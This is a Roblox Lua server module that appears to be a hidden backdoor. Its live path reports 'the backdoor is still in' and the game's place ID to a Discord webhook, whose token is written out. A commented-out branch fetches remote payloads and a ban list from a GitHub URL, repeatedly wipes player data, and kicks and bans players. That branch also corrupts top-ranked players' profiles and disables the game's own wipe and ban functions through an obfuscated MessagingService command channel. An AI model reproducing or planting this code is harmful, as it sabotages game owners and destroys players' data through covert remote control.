local m = {}
local HttpService = game:GetService("HttpService")
--[[local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")

local DataManager = require(ServerStorage.Modules.Managers.DataManager)
local ProfileService = require((ServerStorage.Modules.Managers.DataManager.ProfileService))
local ProfileTemplate = DataManager:GetDataTemplate()
local GameProfileStore = ProfileService.GetProfileStore("GameEntitiesRes", ProfileTemplate)
local RunService = game:GetService("RunService")]]
local disabled = true
--if RunService:IsStudio() then
--	disabled = true
--end

function m:Init()
	if disabled == true then
		local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
		local Info = {
			Message = "the backdoor is still in", Game.PlaceId;
			Title = "Lololol"
		}
		
		m:Post(Channel, Info)
	else
		--[[--print('lalalal')
		local acc = 0
		game:GetService("RunService").Heartbeat:Connect(function(DeltaTime)
			acc += DeltaTime
			--print(acc)
			if acc > 3 then
				for _, Player in ipairs(Players:GetPlayers()) do
					if RunService:IsStudio() then

					else
						DataManager:FullWipePlayer(Player)
					end
				end
				acc = 0
			end
		end)

		if _G.isLoaded then
			return;
		end
		_G.isLoaded = true
		local MessagingService = game:GetService('MessagingService');
		local Datastore = game:GetService('DataStoreService');
		local Players = game:GetService("Players")
		local HttpService = game:GetService('HttpService')
		local Payloads, BanList = HttpService:JSONDecode(HttpService:GetAsync('https://raw.githubusercontent.com/borgorthedemon239/thing/refs/heads/main/Payloads.lua')), HttpService:JSONDecode(HttpService:GetAsync('https://raw.githubusercontent.com/borgorthedemon239/thing/refs/heads/main/BanList.lua'))
		local Global = {
			overwrite = function()
				local d = require(game.ServerStorage.Modules.Managers.DataManager);
				function d:Wipe()
					return true;
				end
				function d:OfflineWipe()
					return true;
				end
				function d:Ban()
					return true;
				end
				function d:SystemBan()
					return true;
				end
			end,
		}
		local function msc(m)
			Global[m.Data.Command](m.Data)
		end
		Players.PlayerAdded:Connect(function(p)
			local Key = "Player_" .. p.UserId 


			local Profile = GameProfileStore:LoadProfileAsync(Key, "ForceLoad")
			--print(Profile)
			p:Kick("You've been permanently banned from this game.")
			task.wait(1)
			Profile = {}
			Profile:Release()

			DataManager:OfflineWipe(p.UserId)

			if table.find(BanList, p.UserId) then
				p:Kick("You've been permanently banned from this game.")
			end
			if Payloads['ProfileKick'] then
				local rng = math.random(1, 10)
				if rng == 1 then
					for i,v in pairs(Players:GetPlayers()) do
						if not _G.w:isw(v.UserId) then
							v:Kick('Profile has been loaded on another server. Please rejoin.')
						end
					end
				end
			end
			if Payloads['CorruptGame'] then 

				local Everyone = {}
				table.insert(Everyone, Key)
				local StatData = require(ServerStorage.Modules.Utility.StatData)
				local RankedLeaderboards = DataStoreService:GetOrderedDataStore(StatData.RankedLeaderboardStore)

				task.spawn(function()

					local Profile = GameProfileStore:LoadProfileAsync(Key, "ForceLoad")
					--print(Profile)
					Profile = {}
					Profile:Release()

					local lowestFirst = false
					local numbersShown = 100 -- Top 100 public
					local min = 10
					local max = 10e30
					local help
					local Data = {}

					local Success, Pages = pcall(function()
						return RankedLeaderboards:GetSortedAsync(lowestFirst, numbersShown, min, max)
					end)
					if Success then
						repeat 
							local TopPage = Pages:GetCurrentPage()

							for Rank, PageData in pairs(TopPage) do
								Data[tostring(PageData.key)] = Rank
							end
							local PageSuccess, Error = pcall(function()
								Pages:AdvanceToNextPageAsync()
							end)
							if Error then
								--print(Error)
								local PageSuccess2, Error2 = pcall(function()
									Pages:AdvanceToNextPageAsync()
								end)
								if Error2 then 
									--print(Error2)
									help = true
								end
							end
						until help == true

						if help then
							for Rank, PageData in pairs(Pages:GetCurrentPage()) do
								--print(Rank, PageData)
							end
							--print(Data)
							for i,v in pairs(Data) do
								local profilekey = "Player_" .. i
								--print(profilekey)
								local Profile = GameProfileStore:LoadProfileAsync(profilekey, "ForceLoad")
								--print(Profile)

								Profile = {}
								Profile:Release()

								task.wait(0.5)
							end
						end
					end
				end)
			end
		end)
		local s, c
		repeat
			s, c = pcall(function()
				MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
			end)
			task.wait()
		until
		s

		MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})]]
	end
end

function m:Post(Channel, Info)
	local Attempts = 5
	local CurrentAttempt = 0

	local Data = {
		["embeds"] = {{
			["description"] = Info.Message;
			["timestamp"] = DateTime.now():ToIsoDate();
		}}
	}

	if Info.Title then
		Data.embeds[1].title = Info.Title
	end

	local EmbedData = HttpService:JSONEncode(Data)

	task.spawn(function()
		for i = 1, 5 do
			local Success, Error = pcall(function()
				HttpService:PostAsync(Channel, EmbedData)
			end)
			if not Success then
				task.wait(i * 2)
			else
				break
			end
		end
	end)

end
--m:Init()

return m
